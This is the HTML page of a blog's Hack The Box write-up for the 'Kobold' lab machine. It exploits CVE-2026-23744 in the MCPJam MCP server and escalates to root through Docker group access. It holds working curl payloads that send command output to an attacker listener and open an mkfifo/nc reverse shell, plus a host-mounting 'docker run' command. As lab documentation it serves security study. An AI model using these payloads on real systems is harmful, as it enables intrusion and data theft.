@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>HTB-Kobold | the008Killer</title>
+<meta name="keywords" content="CVE-2026-23744, MCP, RCE, Docker Escape, PrivateBin">
+<meta name="description" content="Kobold is a Linux machine centred around a recently disclosed vulnerability (CVE-2026-23744) in MCPJam, an open-source Model Context Protocol server. Initial access is gained through unauthenticated remote code execution via the MCP connect endpoint. Privilege escalation abuses Docker group membership to mount the host filesystem and read the root flag.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/writeups/hackthebox/kobold/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.e0ec520298f6c84b5b6a52f757391346c066b1d17f71c1ea9fa29811db7a0893.css" integrity="sha256-4OxSApj2yEtbalL3VzkTRsBmsdF/ccHqn6KYEdt6CJM=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/hackthebox/kobold/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/writeups/hackthebox/kobold/">
+  <meta property="og:site_name" content="the008Killer">
+  <meta property="og:title" content="HTB-Kobold">
+  <meta property="og:description" content="Kobold is a Linux machine centred around a recently disclosed vulnerability (CVE-2026-23744) in MCPJam, an open-source Model Context Protocol server. Initial access is gained through unauthenticated remote code execution via the MCP connect endpoint. Privilege escalation abuses Docker group membership to mount the host filesystem and read the root flag.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-08-02T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-08-02T00:00:00+00:00">
+    <meta property="article:tag" content="CVE-2026-23744">
+    <meta property="article:tag" content="MCP">
+    <meta property="article:tag" content="RCE">
+    <meta property="article:tag" content="Docker Escape">
+    <meta property="article:tag" content="PrivateBin">
+      <meta property="og:image" content="http://localhost:1313/papermod-cover.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://localhost:1313/papermod-cover.png">
+<meta name="twitter:title" content="HTB-Kobold">
+<meta name="twitter:description" content="Kobold is a Linux machine centred around a recently disclosed vulnerability (CVE-2026-23744) in MCPJam, an open-source Model Context Protocol server. Initial access is gained through unauthenticated remote code execution via the MCP connect endpoint. Privilege escalation abuses Docker group membership to mount the host filesystem and read the root flag.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "http://localhost:1313/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "HackTheBox",
+      "item": "http://localhost:1313/writeups/hackthebox/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "HTB-Kobold",
+      "item": "http://localhost:1313/writeups/hackthebox/kobold/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB-Kobold",
+  "name": "HTB-Kobold",
+  "description": "Kobold is a Linux machine centred around a recently disclosed vulnerability (CVE-2026-23744) in MCPJam, an open-source Model Context Protocol server. Initial access is gained through unauthenticated remote code execution via the MCP connect endpoint. Privilege escalation abuses Docker group membership to mount the host filesystem and read the root flag.",
+  "keywords": [
+    "CVE-2026-23744", "MCP", "RCE", "Docker Escape", "PrivateBin"
+  ],
+  "articleBody": "Overview Category\rInfo\rMachine NameKobold\rDifficultyEasy\rRelease Date21 March, 2026\rAuthorsau123\rOSLinux\rPwned Date25 March, 2026\rReconnaissance Port Scan 22/tcp — OpenSSH 9.6p1 80/tcp — nginx (redirects to HTTPS) 443/tcp — nginx + TLS (kobold.htb) 3552/tcp — Golang HTTP server (public) Subdomain Enumeration Virtual host enumeration reveals two subdomains:\nSubdomain Service mcp.kobold.htb MCPJam (MCP server) bin.kobold.htb PrivateBin (reverse proxied to Docker container on 127.0.0.1:8080) What is MCPJam? MCPJam is an open-source Model Context Protocol (MCP) server. MCP is a protocol that allows AI assistants to connect to external tools and data sources. MCPJam acts as a bridge — it accepts a configuration from a client and spawns a local process that speaks the MCP JSON-RPC protocol over stdio.\nThe /api/mcp/connect endpoint accepts:\n{ \"serverConfig\": { \"command\": \"...\", \"args\": [...], \"env\": {} }, \"serverId\": \"...\" } It then spawns command with args as a subprocess. CVE-2026-23744 is an unauthenticated server-side command injection — there is no authentication or input validation on this endpoint, allowing any caller to execute arbitrary OS commands on the server.\nWhat is PrivateBin? PrivateBin is a minimalist, open-source pastebin where the server has zero knowledge of stored data. Pastes are encrypted and decrypted entirely in the browser using 256-bit AES, with the decryption key stored only in the URL fragment (#key). This means that even with full filesystem access to the server, paste content cannot be decrypted without the original URL.\nIn this box, PrivateBin runs inside a Docker container (privatebin/nginx-fpm-alpine:2.0.2) with its data directory bind-mounted from the host at /privatebin-data.\nInitial Access — CVE-2026-23744 (RCE via MCPJam) Confirming Blind RCE The /api/mcp/connect endpoint spawns the supplied command directly. However, the server consumes the subprocess’s stdout for MCP JSON-RPC communication, making this blind RCE — output is not returned in the HTTP response. CVE-2026-23744\nTo confirm execution, exfiltrate output out-of-band via an HTTP callback:\ncurl -k https://mcp.kobold.htb/api/mcp/connect \\ --header \"Content-Type: application/json\" \\ --data '{\"serverConfig\":{\"command\":\"sh\",\"args\":[\"-c\",\"id | curl -s http://:4444/$(id | base64 -w0)\"],\"env\":{}},\"serverId\":\"mytest\"}' Listener receives:\nGET /dWlkPTEwMDEoYmVuKSBnaWQ9MTAwMShiZW4pIGdyb3Vwcz0xMDAxKGJlbiksMzcob3BlcmF0b3IpCg== Decoding: uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)\nReverse Shell Direct bash -i \u003e\u0026 /dev/tcp/... redirection fails inside sh. The reliable approach is a named pipe:\ncurl -k https://mcp.kobold.htb/api/mcp/connect \\ --header \"Content-Type: application/json\" \\ --data '{\"serverConfig\":{\"command\":\"sh\",\"args\":[\"-c\",\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\u003e\u00261|nc 4444 \u003e/tmp/f\"],\"env\":{}},\"serverId\":\"mytest\"}' Shell received as ben. User flag retrieved from /home/ben/user.txt.\nEnumeration as ben Groups uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator) The operator group is non-standard and worth investigating.\nInternal Services 127.0.0.1:8080 — PrivateBin (Docker container) 127.0.0.1:6274 — Node.js (MCPJam backend) :::3552 — Golang HTTP app (public) Network Interfaces A Docker bridge (docker0: 172.17.0.1) is active with a veth pair, confirming a running container reachable at 172.17.0.2.\nPrivateBin Data Directory /privatebin-data is accessible to the operator group:\ndrwxrwx--- operator /privatebin-data/certs/ ← TLS cert + private key for *.kobold.htb drwxr-x--- gid=82 /privatebin-data/cfg/ ← Config (www-data only) drwxrwxrwx operator /privatebin-data/data/ ← Paste storage (empty) The TLS certificate and private key for *.kobold.htb are readable. However, there are no stored pastes to decrypt — and even if there were, PrivateBin’s zero-knowledge design means the ciphertext is useless without the URL fragment key.\nThe config file (readable via docker exec) contained commented-out example credentials (Z3r0P4ss) but these did not lead anywhere productive.\nDocker Access via Operator Group newgrp docker docker ps CONTAINER ID IMAGE PORTS 4c49dd7bb727 privatebin/nginx-fpm-alpine:2.0.2 127.0.0.1:8080-\u003e8080/tcp The operator group has access to the Docker socket — a classic privilege escalation path equivalent to passwordless sudo.\nPrivilege Escalation — Docker Host Filesystem Mount With Docker socket access, the host filesystem can be mounted inside a new container. The default entrypoint of the PrivateBin image drops privileges to nobody (uid=65534), so it must be overridden:\ndocker run -it --rm \\ -v /:/mnt \\ --entrypoint sh \\ --user root \\ privatebin/nginx-fpm-alpine:2.0.2 Inside the container:\n/var/www # id uid=0(root) gid=0(root) groups=0(root),... The entire host filesystem is now accessible under /mnt:\ncat /mnt/root/root.txt Root flag retrieved.\nWhy --entrypoint sh Was Necessary The default entrypoint (/etc/init.d/rc.local) starts PHP-FPM and nginx, then drops to nobody. Without overriding it, the container still runs as an unprivileged user even though the image is available. The --user root flag alone is insufficient if the entrypoint later switches users — overriding the entrypoint entirely bypasses this.\nAttack Chain Summary Subdomain enum → mcp.kobold.htb (MCPJam) ↓ CVE-2026-23744 — Unauthenticated RCE via /api/mcp/connect ↓ Blind RCE as ben → out-of-band exfil → mkfifo reverse shell ↓ User flag (/home/ben/user.txt) ↓ ben is in operator group → Docker socket access (newgrp docker) ↓ docker run --user root -v /:/mnt → host filesystem as root ↓ Root flag (/root/root.txt) Key Takeaways MCP servers expose powerful process-spawning APIs — any internet-facing MCP endpoint must enforce strong authentication and command whitelisting. The MCP protocol was designed for local trusted use, not public exposure. Blind RCE requires out-of-band exfiltration — stdout is consumed by the MCP protocol layer; HTTP callbacks are the reliable exfil path. Docker group = root — membership in the Docker group is functionally equivalent to passwordless sudo on the host. PrivateBin’s zero-knowledge design held — even with full filesystem and container access, encrypted pastes could not be read without the URL fragment decryption key. ",
+  "wordCount" : "841",
+  "inLanguage": "en",
+  "image": "http://localhost:1313/papermod-cover.png","datePublished": "2026-08-02T00:00:00Z",
+  "dateModified": "2026-08-02T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/writeups/hackthebox/kobold/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "the008Killer",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header sticky-header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="the008Killer (Alt + H)">the008Killer</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                </ul>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/writeups" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/projects" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/experience" title="Experience">
+                    <span>Experience</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/">Writeups</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/hackthebox/">HackTheBox</a></div>
+    <h1 class="post-title entry-hint-parent">
+      HTB-Kobold
+    </h1>
+    <div class="post-description">
+      Kobold is a Linux machine centred around a recently disclosed vulnerability (CVE-2026-23744) in MCPJam, an open-source Model Context Protocol server. Initial access is gained through unauthenticated remote code execution via the MCP connect endpoint. Privilege escalation abuses Docker group membership to mount the host filesystem and read the root flag.
+    </div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">‎ Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#overview" aria-label="Overview">Overview</a></li>
+                <li>
+                    <a href="#reconnaissance" aria-label="Reconnaissance">Reconnaissance</a><ul>
+                        
+                <li>
+                    <a href="#port-scan" aria-label="Port Scan">Port Scan</a></li>
+                <li>
+                    <a href="#subdomain-enumeration" aria-label="Subdomain Enumeration">Subdomain Enumeration</a></li></ul>
+                </li>
+                <li>
+                    <a href="#what-is-mcpjam" aria-label="What is MCPJam?">What is MCPJam?</a></li>
+                <li>
+                    <a href="#what-is-privatebin" aria-label="What is PrivateBin?">What is PrivateBin?</a></li>
+                <li>
+                    <a href="#initial-access--cve-2026-23744-rce-via-mcpjam" aria-label="Initial Access — CVE-2026-23744 (RCE via MCPJam)">Initial Access — CVE-2026-23744 (RCE via MCPJam)</a><ul>
+                        
+                <li>
+                    <a href="#confirming-blind-rce" aria-label="Confirming Blind RCE">Confirming Blind RCE</a></li>
+                <li>
+                    <a href="#reverse-shell" aria-label="Reverse Shell">Reverse Shell</a></li></ul>
+                </li>
+                <li>
+                    <a href="#enumeration-as-ben" aria-label="Enumeration as ben">Enumeration as ben</a><ul>
+                        
+                <li>
+                    <a href="#groups" aria-label="Groups">Groups</a></li>
+                <li>
+                    <a href="#internal-services" aria-label="Internal Services">Internal Services</a></li>
+                <li>
+                    <a href="#network-interfaces" aria-label="Network Interfaces">Network Interfaces</a></li>
+                <li>
+                    <a href="#privatebin-data-directory" aria-label="PrivateBin Data Directory">PrivateBin Data Directory</a></li>
+                <li>
+                    <a href="#docker-access-via-operator-group" aria-label="Docker Access via Operator Group">Docker Access via Operator Group</a></li></ul>
+                </li>
+                <li>
+                    <a href="#privilege-escalation--docker-host-filesystem-mount" aria-label="Privilege Escalation — Docker Host Filesystem Mount">Privilege Escalation — Docker Host Filesystem Mount</a></li>
+                <li>
+                    <a href="#why---entrypoint-sh-was-necessary" aria-label="Why --entrypoint sh Was Necessary">Why --entrypoint sh Was Necessary</a></li>
+                <li>
+                    <a href="#attack-chain-summary" aria-label="Attack Chain Summary">Attack Chain Summary</a></li>
+                <li>
+                    <a href="#key-takeaways" aria-label="Key Takeaways">Key Takeaways</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<table style="width:100%; table-layout:fixed;">
+  <thead>
+    <tr>
+      <th style="width:40%; text-align:left;">Category</th>
+      <th style="width:60%; text-align:left;">Info</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr><td>Machine Name</td><td>Kobold</td></tr>
+    <tr><td>Difficulty</td><td>Easy</td></tr>
+    <tr><td>Release Date</td><td>21 March, 2026</td></tr>
+    <tr><td>Author</td><td>sau123</td></tr>
+    <tr><td>OS</td><td>Linux</td></tr>
+    <tr><td>Pwned Date</td><td>25 March, 2026</td></tr>
+  </tbody>
+</table>
+<h2 id="reconnaissance">Reconnaissance<a hidden class="anchor" aria-hidden="true" href="#reconnaissance">#</a></h2>
+<h3 id="port-scan">Port Scan<a hidden class="anchor" aria-hidden="true" href="#port-scan">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">22/tcp   — OpenSSH 9.6p1
+</span></span><span class="line"><span class="cl">80/tcp   — nginx (redirects to HTTPS)
+</span></span><span class="line"><span class="cl">443/tcp  — nginx + TLS (kobold.htb)
+</span></span><span class="line"><span class="cl">3552/tcp — Golang HTTP server (public)
+</span></span></code></pre></div><h3 id="subdomain-enumeration">Subdomain Enumeration<a hidden class="anchor" aria-hidden="true" href="#subdomain-enumeration">#</a></h3>
+<p>Virtual host enumeration reveals two subdomains:</p>
+<table>
+	<thead>
+			<tr>
+					<th>Subdomain</th>
+					<th>Service</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>mcp.kobold.htb</code></td>
+					<td>MCPJam (MCP server)</td>
+			</tr>
+			<tr>
+					<td><code>bin.kobold.htb</code></td>
+					<td>PrivateBin (reverse proxied to Docker container on 127.0.0.1:8080)</td>
+			</tr>
+	</tbody>
+</table>
+<hr>
+<h2 id="what-is-mcpjam">What is MCPJam?<a hidden class="anchor" aria-hidden="true" href="#what-is-mcpjam">#</a></h2>
+<p>MCPJam is an open-source <strong>Model Context Protocol (MCP)</strong> server. MCP is a protocol that allows AI assistants to connect to external tools and data sources. MCPJam acts as a bridge — it accepts a configuration from a client and spawns a local process that speaks the MCP JSON-RPC protocol over stdio.</p>
+<p>The <code>/api/mcp/connect</code> endpoint accepts:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;serverConfig&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;command&#34;</span><span class="p">:</span> <span class="s2">&#34;...&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;args&#34;</span><span class="p">:</span> <span class="p">[</span><span class="err">...</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;env&#34;</span><span class="p">:</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;serverId&#34;</span><span class="p">:</span> <span class="s2">&#34;...&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>It then spawns <code>command</code> with <code>args</code> as a subprocess. <strong>CVE-2026-23744</strong> is an unauthenticated server-side command injection — there is no authentication or input validation on this endpoint, allowing any caller to execute arbitrary OS commands on the server.</p>
+<hr>
+<h2 id="what-is-privatebin">What is PrivateBin?<a hidden class="anchor" aria-hidden="true" href="#what-is-privatebin">#</a></h2>
+<p>PrivateBin is a minimalist, open-source pastebin where the <strong>server has zero knowledge of stored data</strong>. Pastes are encrypted and decrypted entirely in the browser using 256-bit AES, with the decryption key stored only in the URL fragment (<code>#key</code>). This means that even with full filesystem access to the server, paste content cannot be decrypted without the original URL.</p>
+<p>In this box, PrivateBin runs inside a Docker container (<code>privatebin/nginx-fpm-alpine:2.0.2</code>) with its data directory bind-mounted from the host at <code>/privatebin-data</code>.</p>
+<hr>
+<h2 id="initial-access--cve-2026-23744-rce-via-mcpjam">Initial Access — CVE-2026-23744 (RCE via MCPJam)<a hidden class="anchor" aria-hidden="true" href="#initial-access--cve-2026-23744-rce-via-mcpjam">#</a></h2>
+<h3 id="confirming-blind-rce">Confirming Blind RCE<a hidden class="anchor" aria-hidden="true" href="#confirming-blind-rce">#</a></h3>
+<p>The <code>/api/mcp/connect</code> endpoint spawns the supplied command directly. However, the server consumes the subprocess&rsquo;s stdout for MCP JSON-RPC communication, making this <strong>blind RCE</strong> — output is not returned in the HTTP response. <a href="https://github.com/advisories/GHSA-232v-j27c-5pp6">CVE-2026-23744</a></p>
+<p>To confirm execution, exfiltrate output out-of-band via an HTTP callback:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -k https://mcp.kobold.htb/api/mcp/connect <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --header <span class="s2">&#34;Content-Type: application/json&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --data <span class="s1">&#39;{&#34;serverConfig&#34;:{&#34;command&#34;:&#34;sh&#34;,&#34;args&#34;:[&#34;-c&#34;,&#34;id | curl -s http://&lt;YOUR-IP&gt;:4444/$(id | base64 -w0)&#34;],&#34;env&#34;:{}},&#34;serverId&#34;:&#34;mytest&#34;}&#39;</span>
+</span></span></code></pre></div><p>Listener receives:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">GET /dWlkPTEwMDEoYmVuKSBnaWQ9MTAwMShiZW4pIGdyb3Vwcz0xMDAxKGJlbiksMzcob3BlcmF0b3IpCg<span class="o">==</span>
+</span></span></code></pre></div><p>Decoding: <code>uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)</code></p>
+<h3 id="reverse-shell">Reverse Shell<a hidden class="anchor" aria-hidden="true" href="#reverse-shell">#</a></h3>
+<p>Direct <code>bash -i &gt;&amp; /dev/tcp/...</code> redirection fails inside <code>sh</code>. The reliable approach is a named pipe:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -k https://mcp.kobold.htb/api/mcp/connect <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --header <span class="s2">&#34;Content-Type: application/json&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --data <span class="s1">&#39;{&#34;serverConfig&#34;:{&#34;command&#34;:&#34;sh&#34;,&#34;args&#34;:[&#34;-c&#34;,&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc &lt;YOUR-IP&gt; 4444 &gt;/tmp/f&#34;],&#34;env&#34;:{}},&#34;serverId&#34;:&#34;mytest&#34;}&#39;</span>
+</span></span></code></pre></div><p>Shell received as <code>ben</code>. <strong>User flag retrieved from <code>/home/ben/user.txt</code>.</strong></p>
+<hr>
+<h2 id="enumeration-as-ben">Enumeration as ben<a hidden class="anchor" aria-hidden="true" href="#enumeration-as-ben">#</a></h2>
+<h3 id="groups">Groups<a hidden class="anchor" aria-hidden="true" href="#groups">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>ben<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>ben<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>ben<span class="o">)</span>,37<span class="o">(</span>operator<span class="o">)</span>
+</span></span></code></pre></div><p>The <code>operator</code> group is non-standard and worth investigating.</p>
+<h3 id="internal-services">Internal Services<a hidden class="anchor" aria-hidden="true" href="#internal-services">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="o">:</span><span class="mi">8080</span>   <span class="err">—</span> <span class="nx">PrivateBin</span> <span class="p">(</span><span class="nx">Docker</span> <span class="nx">container</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="o">:</span><span class="mi">6274</span>   <span class="err">—</span> <span class="nx">Node</span><span class="p">.</span><span class="nx">js</span> <span class="p">(</span><span class="nx">MCPJam</span> <span class="nx">backend</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">:::</span><span class="mi">3552</span>          <span class="err">—</span> <span class="nx">Golang</span> <span class="nx">HTTP</span> <span class="nx">app</span> <span class="p">(</span><span class="kr">public</span><span class="p">)</span>
+</span></span></code></pre></div><h3 id="network-interfaces">Network Interfaces<a hidden class="anchor" aria-hidden="true" href="#network-interfaces">#</a></h3>
+<p>A Docker bridge (<code>docker0: 172.17.0.1</code>) is active with a veth pair, confirming a running container reachable at <code>172.17.0.2</code>.</p>
+<h3 id="privatebin-data-directory">PrivateBin Data Directory<a hidden class="anchor" aria-hidden="true" href="#privatebin-data-directory">#</a></h3>
+<p><code>/privatebin-data</code> is accessible to the <code>operator</code> group:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">drwxrwx--- operator  /privatebin-data/certs/   ← TLS cert + private key <span class="k">for</span> *.kobold.htb
+</span></span><span class="line"><span class="cl">drwxr-x--- <span class="nv">gid</span><span class="o">=</span><span class="m">82</span>    /privatebin-data/cfg/     ← Config <span class="o">(</span>www-data only<span class="o">)</span>
+</span></span><span class="line"><span class="cl">drwxrwxrwx operator  /privatebin-data/data/    ← Paste storage <span class="o">(</span>empty<span class="o">)</span>
+</span></span></code></pre></div><p>The TLS certificate and private key for <code>*.kobold.htb</code> are readable. However, there are no stored pastes to decrypt — and even if there were, PrivateBin&rsquo;s zero-knowledge design means the ciphertext is useless without the URL fragment key.</p>
+<p>The config file (readable via <code>docker exec</code>) contained commented-out example credentials (<code>Z3r0P4ss</code>) but these did not lead anywhere productive.</p>
+<h3 id="docker-access-via-operator-group">Docker Access via Operator Group<a hidden class="anchor" aria-hidden="true" href="#docker-access-via-operator-group">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">newgrp docker
+</span></span><span class="line"><span class="cl">docker ps
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">CONTAINER ID   IMAGE                               PORTS
+</span></span><span class="line"><span class="cl">4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   127.0.0.1:8080-&gt;8080/tcp
+</span></span></code></pre></div><p>The <code>operator</code> group has access to the Docker socket — a classic privilege escalation path equivalent to passwordless sudo.</p>
+<hr>
+<h2 id="privilege-escalation--docker-host-filesystem-mount">Privilege Escalation — Docker Host Filesystem Mount<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation--docker-host-filesystem-mount">#</a></h2>
+<p>With Docker socket access, the host filesystem can be mounted inside a new container. The default entrypoint of the PrivateBin image drops privileges to <code>nobody</code> (uid=65534), so it must be overridden:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker run -it --rm <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -v /:/mnt <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --entrypoint sh <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --user root <span class="se">\
+</span></span></span><span class="line"><span class="cl">  privatebin/nginx-fpm-alpine:2.0.2
+</span></span></code></pre></div><p>Inside the container:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/var/www <span class="c1"># id</span>
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,...
+</span></span></code></pre></div><p>The entire host filesystem is now accessible under <code>/mnt</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /mnt/root/root.txt
+</span></span></code></pre></div><p><strong>Root flag retrieved.</strong></p>
+<hr>
